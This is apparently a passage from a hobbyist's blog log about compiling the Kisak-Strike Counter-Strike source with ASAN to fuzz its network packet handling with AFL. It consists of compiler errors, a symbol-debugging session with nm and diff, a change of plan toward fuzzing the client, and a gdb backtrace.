/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14099:43: error: qualified-id in declaration before ‘(’ token
14099 | void CCSPlayer::RecordRebuyStructLastRound( void )
      |                                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14109:30: error: qualified-id in declaration before ‘(’ token
14109 | void CCSPlayer::SetKilledTime( float time )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14126:60: error: qualified-id in declaration before ‘(’ token
14126 | const CCSWeaponInfo* CCSPlayer::GetWeaponInfoFromDamageInfo( const CTakeDamageInfo &info )
      |                                                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14144:39: error: qualified-id in declaration before ‘(’ token
14144 | void CCSPlayer::RestoreWeaponOnC4Abort( void )
      |                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14161:32: error: qualified-id in declaration before ‘(’ token
14161 | void CCSPlayer::PlayerUsedKnife( void )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14167:34: error: qualified-id in declaration before ‘(’ token
14167 | void CCSPlayer::PlayerUsedGrenade( int nWeaponID )
      |                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14193:34: error: qualified-id in declaration before ‘(’ token
14193 | void CCSPlayer::PlayerUsedFirearm( CBaseCombatWeapon* pBaseWeapon )
      |                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14219:34: error: qualified-id in declaration before ‘(’ token
14219 | void CCSPlayer::AddBurnDamageDelt( int entityIndex )
      |                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14230:44: error: qualified-id in declaration before ‘(’ token
14230 | int CCSPlayer::GetNumPlayersDamagedWithFire()
      |                                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14234:44: error: qualified-id in declaration before ‘(’ token
14234 | void CCSPlayer::PlayerEmptiedAmmoForFirearm( CBaseCombatWeapon* pBaseWeapon )
      |                                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14257:44: error: qualified-id in declaration before ‘(’ token
14257 | bool CCSPlayer::DidPlayerEmptyAmmoForWeapon( CBaseCombatWeapon* pBaseWeapon )
      |                                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14282:38: error: qualified-id in declaration before ‘(’ token
14282 | void CCSPlayer::SetWasKilledThisRound(bool wasKilled )
      |                                      ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14300:47: error: qualified-id in declaration before ‘(’ token
14300 | void CCSPlayer::ProcessPlayerDeathAchievements( CCSPlayer *pAttacker, CCSPlayer *pVictim, const CTakeDamageInfo &info )
      |                                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14715:47: error: qualified-id in declaration before ‘(’ token
14715 | CBaseEntity* CCSPlayer::GetNearestSurfaceBelow(float maxTrace )
      |                                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14736:27: error: qualified-id in declaration before ‘(’ token
14736 | void CCSPlayer::OnRoundEnd(int winningTeam, int reason )
      |                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14856:46: error: qualified-id in declaration before ‘(’ token
14856 | void CCSPlayer::SendGunGameWeaponUpgradeAlert( void )
      |                                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14867:32: error: qualified-id in declaration before ‘(’ token
14867 | void CCSPlayer::OnPreResetRound()
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14980:33: error: qualified-id in declaration before ‘(’ token
14980 | void CCSPlayer::OnCanceledDefuse()
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14989:32: error: qualified-id in declaration before ‘(’ token
14989 | void CCSPlayer::OnStartedDefuse()
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15008:39: error: qualified-id in declaration before ‘(’ token
15008 | void CCSPlayer::AttemptToExitFreezeCam( void )
      |                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15020:35: error: qualified-id in declaration before ‘(’ token
15020 | void CCSPlayer::SetPlayerDominated( CCSPlayer *pPlayer, bool bDominated )
      |                                   ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15030:38: error: qualified-id in declaration before ‘(’ token
15030 | void CCSPlayer::SetPlayerDominatingMe( CCSPlayer *pPlayer, bool bDominated )
      |                                      ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15040:34: error: qualified-id in declaration before ‘(’ token
15040 | bool CCSPlayer::IsPlayerDominated( int iPlayerIndex )
      |                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15048:37: error: qualified-id in declaration before ‘(’ token
15048 | bool CCSPlayer::IsPlayerDominatingMe( int iPlayerIndex )
      |                                     ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15058:1: error: a function-definition is not allowed here before ‘{’ token
15058 | {
      | ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15083:33: error: qualified-id in declaration before ‘(’ token
15083 | void CCSPlayer::IncrementNumMVPs( CSMvpReason_t mvpReason )
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15131:27: error: qualified-id in declaration before ‘(’ token
15131 | void CCSPlayer::SetNumMVPs( int iNumMVP )
      |                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15147:26: error: qualified-id in declaration before ‘(’ token
15147 | int CCSPlayer::GetNumMVPs()
      |                          ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15155:43: error: qualified-id in declaration before ‘(’ token
15155 | void CCSPlayer::RemoveNemesisRelationships()
      |                                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15171:37: error: qualified-id in declaration before ‘(’ token
15171 | void CCSPlayer::CheckMaxGrenadeKills(int grenadeKills )
      |                                     ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15179:30: error: qualified-id in declaration before ‘(’ token
15179 | void CCSPlayer::CommitSuicide( bool bExplode /*= false*/, bool bForce /*= false*/ )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15185:30: error: qualified-id in declaration before ‘(’ token
15185 | void CCSPlayer::CommitSuicide( const Vector &vecForce, bool bExplode /*= false*/, bool bForce /*= false*/ )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15191:54: error: qualified-id in declaration before ‘(’ token
15191 | void CCSPlayer::DecrementProgressiveWeaponFromSuicide( void )
      |                                                      ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15211:35: error: qualified-id in declaration before ‘(’ token
15211 | int CCSPlayer::GetNumEnemyDamagers()
      |                                   ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15227:36: error: qualified-id in declaration before ‘(’ token
15227 | int CCSPlayer::GetNumEnemiesDamaged()
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15242:54: error: qualified-id in declaration before ‘(’ token
15242 | int CCSPlayer::GetTotalActualHealthRemovedFromEnemies()
      |                                                      ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15257:30: error: qualified-id in declaration before ‘(’ token
15257 | bool CCSPlayer::ShouldCollide( int collisionGroup, int contentsMask ) const
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15275:50: error: qualified-id in declaration before ‘(’ token
15275 | void CCSPlayer::GiveHealthAndArmorForGuardianMode( bool bAdditive )
      |                                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15319:26: error: qualified-id in declaration before ‘(’ token
15319 | void CCSPlayer::SetHealth( int amt )
      |                          ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15328:33: error: qualified-id in declaration before ‘(’ token
15328 | void CCSPlayer::OnHealthshotUsed( void )
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15334:42: error: qualified-id in declaration before ‘(’ token
15334 | bool CCSPlayer::UpdateTeamLeaderPlaySound( int nTeam )
      |                                          ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15439:29: error: qualified-id in declaration before ‘(’ token
15439 | void CCSPlayer::UpdateLeader( void )
      |                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15463:36: error: qualified-id in declaration before ‘(’ token
15463 | void CCSPlayer::ResetTRBombModeData( void )
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15476:35: error: qualified-id in declaration before ‘(’ token
15476 | void CCSPlayer::SavePreControlData()
      |                                   ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15489:30: error: qualified-id in declaration before ‘(’ token
15489 | bool CCSPlayer::CanControlBot( CCSBot *pBot, bool bSkipTeamCheck )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15532:33: error: qualified-id in declaration before ‘(’ token
15532 | bool CCSPlayer::TakeControlOfBot( CCSBot *pBot, bool bSkipTeamCheck )
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15767:36: error: qualified-id in declaration before ‘(’ token
15767 | void CCSPlayer::ReleaseControlOfBot()
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15846:46: error: qualified-id in declaration before ‘(’ token
15846 | CCSBot* CCSPlayer::FindNearestControllableBot( bool bMustBeValidObserverTarget )
      |                                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15884:32: error: qualified-id in declaration before ‘(’ token
15884 | void CCSPlayer::UpdateInventory( bool bInit )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15915:31: error: qualified-id in declaration before ‘(’ token
15915 | void CCSPlayer::UpdateOnRemove( void )
      |                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:15972:35: error: qualified-id in declaration before ‘(’ token
15972 | void CCSPlayer::IncrementFragCount( int nCount, int nHeadshots )
      |                                   ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16116:40: error: qualified-id in declaration before ‘(’ token
16116 | void CCSPlayer::IncrementTeamKillsCount( int nCount )
      |                                        ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16130:43: error: qualified-id in declaration before ‘(’ token
16130 | void CCSPlayer::IncrementHostageKillsCount( int nCount )
      |                                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16144:42: error: qualified-id in declaration before ‘(’ token
16144 | void CCSPlayer::IncrementTeamDamagePoints( int numDamagePoints )
      |                                          ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16158:38: error: qualified-id in declaration before ‘(’ token
16158 | void CCSPlayer::IncrementAssistsCount( int nCount )
      |                                      ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16193:36: error: qualified-id in declaration before ‘(’ token
16193 | void CCSPlayer::IncrementDeathCount( int nCount )
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16230:32: error: qualified-id in declaration before ‘(’ token
16230 | void CCSPlayer::SetLastKillTime( float time )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16235:33: error: qualified-id in declaration before ‘(’ token
16235 | float CCSPlayer::GetLastKillTime()
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16240:36: error: qualified-id in declaration before ‘(’ token
16240 | void CCSPlayer::IncrementKillStreak( int nCount )
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16275:32: error: qualified-id in declaration before ‘(’ token
16275 | void CCSPlayer::ResetKillStreak()
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16280:29: error: qualified-id in declaration before ‘(’ token
16280 | int CCSPlayer::GetKillStreak()
      |                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16285:37: error: qualified-id in declaration before ‘(’ token
16285 | void CCSPlayer::AddContributionScore( int iPoints )
      |                                     ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16317:25: error: qualified-id in declaration before ‘(’ token
16317 | void CCSPlayer::AddScore( int iPoints )
      |                         ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16338:42: error: qualified-id in declaration before ‘(’ token
16338 | void CCSPlayer::AddRoundContributionScore( int iPoints )
      |                                          ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16343:39: error: qualified-id in declaration before ‘(’ token
16343 | void CCSPlayer::AddRoundProximityScore( int iPoints )
      |                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16348:43: error: qualified-id in declaration before ‘(’ token
16348 | int CCSPlayer::GetNumConcurrentDominations( )
      |                                           ^
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/tier1.h:16,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier2/tier2.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier3/tier3.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/vphysics_interface.h:20,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cbase.h:46,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:8:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:4: error: cannot declare static function inside another function
 1122 |    static void name( const CCommand &args ); \
      |    ^~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16364:1: note: in expansion of macro ‘CON_COMMAND_F’
16364 | CON_COMMAND_F( observer_use, "", FCVAR_GAMEDLL_FOR_REMOTE_CLIENTS )
      | ^~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16365:1: error: a function-definition is not allowed here before ‘{’ token
16365 | {
      | ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16376:24: error: qualified-id in declaration before ‘(’ token
16376 | void CCSPlayer::Unblind( void )
      |                        ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16414:39: error: qualified-id in declaration before ‘(’ token
16414 | int CCSPlayer::GetAccountForScoreboard()
      |                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16425:33: error: qualified-id in declaration before ‘(’ token
16425 | void CCSPlayer::UpdateRankFromKV( KeyValues *pKV )
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16440:24: error: qualified-id in declaration before ‘(’ token
16440 | void CCSPlayer::SetRank( MedalCategory_t category, MedalRank_t rank )
      |                        ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16445:48: error: qualified-id in declaration before ‘(’ token
16445 | void CCSPlayer::UpdateEquippedCoinFromInventory()
      |                                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16450:27: error: qualified-id in declaration before ‘(’ token
16450 | void CCSPlayer::SetMusicID( uint16 unMusicID )
      |                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16454:49: error: qualified-id in declaration before ‘(’ token
16454 | void CCSPlayer::UpdateEquippedMusicFromInventory()
      |                                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16459:55: error: qualified-id in declaration before ‘(’ token
16459 | void CCSPlayer::UpdateEquippedPlayerSprayFromInventory()
      |                                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16464:47: error: qualified-id in declaration before ‘(’ token
16464 | void CCSPlayer::UpdatePersonaDataFromInventory()
      |                                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16468:63: error: qualified-id in declaration before ‘(’ token
16468 | CEconPersonaDataPublic const * CCSPlayer::GetPersonaDataPublic() const
      |                                                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16473:32: error: qualified-id in declaration before ‘(’ token
16473 | bool CCSPlayer::CanKickFromTeam( int kickTeam )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16482:39: error: qualified-id in declaration before ‘(’ token
16482 | bool CCSPlayer::CanHearAndReadChatFrom( CBasePlayer *pPlayer )
      |                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16499:28: error: qualified-id in declaration before ‘(’ token
16499 | void CCSPlayer::ObserverUse( bool bIsPressed )
      |                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16556:44: error: qualified-id in declaration before ‘(’ token
16556 | bool CCSPlayer::GetBulletHitLocalBoneOffset( const trace_t &tr, int &boneIndexOut, Vector &vecPositionOut, QAngle &angAngleOut )
      |                                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16581:1: error: expected ‘}’ at end of input
16581 | }
      | ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:12726:1: note: to match this ‘{’
12726 | {
      | ^
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6697: game/server/CMakeFiles/server_client.dir/__/shared/cstrike15/cs_player_shared.cpp.o] Error 1
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6619: game/server/CMakeFiles/server_client.dir/cstrike15/cs_gamestats.cpp.o] Error 1
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6606: game/server/CMakeFiles/server_client.dir/__/shared/cstrike15/cs_gamerules.cpp.o] Error 1
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/tier1.h:16,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier2/tier2.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier3/tier3.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/vphysics_interface.h:20,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cbase.h:46,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:8:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp: At global scope:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:16364:16: warning: ‘void observer_use(const CCommand&)’ used but never defined
16364 | CON_COMMAND_F( observer_use, "", FCVAR_GAMEDLL_FOR_REMOTE_CLIENTS )
      |                ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:16: note: in definition of macro ‘CON_COMMAND_F’
 1122 |    static void name( const CCommand &args ); \
      |                ^~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13958:16: warning: ‘void replay_stop(const CCommand&)’ used but never defined
13958 | CON_COMMAND_F( replay_stop, "stop hltv replay", FCVAR_GAMEDLL_FOR_REMOTE_CLIENTS )
      |                ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:16: note: in definition of macro ‘CON_COMMAND_F’
 1122 |    static void name( const CCommand &args ); \
      |                ^~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13945:16: warning: ‘void replay_death(const CCommand&)’ used but never defined
13945 | CON_COMMAND_F( replay_death, "start hltv replay of last death", FCVAR_CHEAT )
      |                ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:16: note: in definition of macro ‘CON_COMMAND_F’
 1122 |    static void name( const CCommand &args ); \
      |                ^~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13907:16: warning: ‘void replay_start(const CCommand&)’ used but never defined
13907 | CON_COMMAND_F( replay_start, "Start GOTV replay: replay_start <delay> [<player name or index>]", FCVAR_CHEAT )
      |                ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:16: note: in definition of macro ‘CON_COMMAND_F’
 1122 |    static void name( const CCommand &args ); \
      |                ^~~~
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6671: game/server/CMakeFiles/server_client.dir/cstrike15/cs_player.cpp.o] Error 1
make[1]: *** [CMakeFiles/Makefile2:3510: game/server/CMakeFiles/server_client.dir/all] Error 2
make: *** [Makefile:152: all] Error 2




```
{% endraw %}

Ok so after basically just nuking a lot of stuff we can continue the compilation a bit again. Yeah! (Again I really think that this will end up as a failure, because there is no way that this shit honestly runs.)

And holy shit! It compiled succesfully! Welp, time to try and see if it runs!

Aaannddd no:

{% raw %}
```

# failed to dlopen /home/cyberhacker/Netpacketfuzzer/game/csgo/bin/linux64/server_client.so error=/home/cyberhacker/Netpacketfuzzer/game/csgo/bin/linux64/server_client.so: undefined symbol: _ZTI28CSteamWorksGameStatsUploader

```
{% endraw %}

Maybe we messed something up and maybe recompiling will help???? (Wishful thinking imo..)


aaannd fuck.

same error

The only files which contains that string are these files:

{% raw %}
```

cyberhacker@cyberhacker-h8-1131sc:~/Netpacketfuzzer/Kisak-Strike$ grep --exclude-dir=cmake-build/ -iRl CSteamWorksGameStatsUploader *
game/client/steamworks_gamestats_client.h
game/shared/steamworks_gamestats.h
game/shared/steamworks_gamestats.cpp
game/server/steamworks_gamestats_server.h


```
{% endraw %}

And I don't know why the symbol is undefined. Looking at the source code we seem to be including the definition of it but idk. lets compare this to the client which works fine maybe?


Client:
{% raw %}
```

r/__/shared$ nm steamworks_gamestats.cpp.o | grep _ZTV28CSteamWorksGameStatsUploader
0000000000000000 V _ZTV28CSteamWorksGameStatsUploader
```
{% endraw %}

Server:

{% raw %}
```

__/shared$ nm steamworks_gamestats.cpp.o | grep _ZTV28CSteamWorksGameStatsUploader
                 U _ZTV28CSteamWorksGameStatsUploader


```
{% endraw %}



so the problem is in the steamworks_gamestats.cpp file but idk what it is.

here is the difference between the two files:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Netpacketfuzzer/Kisak-Strike/game/shared$ diff steamworks_gamestats.cpp /home/cyberhacker/Codecoveragething/Kisak-Strike/game/shared/steamworks_gamestats.cpp 
265,269c265,266
< // MODIFIED
< #ifndef	NO_STEAM
< 		//SteamAPICall_t hSteamAPICall = m_SteamWorksInterface->GetNewSession( accountType, m_UserID, m_iAppID, GetTimeSinceEpoch() );
< 		//m_CallbackSteamSessionInfoIssued.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoIssued );
< #endif
---
> 		SteamAPICall_t hSteamAPICall = m_SteamWorksInterface->GetNewSession( accountType, m_UserID, m_iAppID, GetTimeSinceEpoch() );
> 		m_CallbackSteamSessionInfoIssued.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoIssued );
418,421c415,417
< 		// MODIFIED
< 		//WriteSessionRow();
< 		//SteamAPICall_t hSteamAPICall = m_SteamWorksInterface->EndSession( m_SessionID, m_EndTime, 0 );
< 		//m_CallbackSteamSessionInfoClosed.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoClosed );
---
> 		WriteSessionRow();
> 		SteamAPICall_t hSteamAPICall = m_SteamWorksInterface->EndSession( m_SessionID, m_EndTime, 0 );
> 		m_CallbackSteamSessionInfoClosed.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoClosed );

```
{% endraw %}

I don't know. Maybe it is something to do with the compile flags or some shit like that? Anyway, see ya tomorrow.

------------------------------------------------

## Change of plan.

Ok so fuck that. We are going to fuzz on the client, because when you type "map de_dust2" on the console, it opens up the de_dust2 map and I think that it still "emulates" (if that's the right word) the server and it still accepts packets, so lets do that instead. I am going to make a copy of this NO_STEAM directory, but I am not too hopeful that I will return to it any time soon.

After testing the client, yeah I am right, the client also calls ProcessPacket on it. Sooo just compile the client with ASAN and then add the fuzzing harness to it the same way??

Also I think that you can use an autoexec file so this makes it easier, when the fuzzer restarts after the __AFL_LOOP() counter is done, because to make the server jump to this code, we need to basically connect a client to the server and that is a whole other mess to do. Of course this adds a quite a bit of overhead when restarting the fuzzer, because we need to initialize the GUI and stuff which we don't even need, but if we put the __AFL_LOOP() counter high enough (like a million or something), then this shouldn't be too bad I think.

After trying to compile the client again, I get this error:

{% raw %}
```
Failed to load the launcher(bin/linux64/launcher_client.so) (../../lib/public/linux64/libsteam_api.so: cannot open shared object file: No such file or directory)
```
{% endraw %}

which is not promising. Maybe recompile will help? (Once again wishful thinking.)

--------------------------

After recompiling we get this error then:


{% raw %}
```

0x00007fffc4da40b8 in KeyValues::FindKey (this=<optimized out>, keyName=0x7fffc702d480 "nameID", bCreate=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/tier1/keyvalues.cpp:1038
1038		for (dat = m_pSub; dat != NULL; dat = dat->m_pPeer)
(gdb) where
#0  0x00007fffc4da40b8 in KeyValues::FindKey (this=<optimized out>, keyName=0x7fffc702d480 "nameID", bCreate=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/tier1/keyvalues.cpp:1038
#1  0x00007fffc4da89d6 in KeyValues::GetString (this=<optimized out>, keyName=<optimized out>, defaultValue=0x7fffc7026a20 "") at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/tier1/keyvalues.cpp:1581
#2  0x00007fffc2f827e6 in CEconQuestDefinition::BInitFromKV (this=0x610000313040, pKVQuestDef=<optimized out>, pschema=..., pVecErrors=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:881
#3  0x00007fffc300cec1 in CEconItemSchema::BInitQuestDefs (this=0x61d0003e9e88, pKVQuestDefs=<optimized out>, pVecErrors=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:8447
#4  0x00007fffc303a7e0 in CEconItemSchema::BInitSchema (this=<optimized out>, pKVRawDefinition=<optimized out>, pVecErrors=0x7fffffffcca0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:6785
#5  0x00007fffc2f3d0bd in CEconItemSchema::BInit (this=0x61d0003e9e88, fileName=<optimized out>, pathID=<optimized out>, pVecErrors=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:6421
#6  0x00007fffc2dd40f2 in CEconItemSystem::ParseItemSchemaFile (this=<optimized out>, pFilename=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/econ/econ_item_system.cpp:242
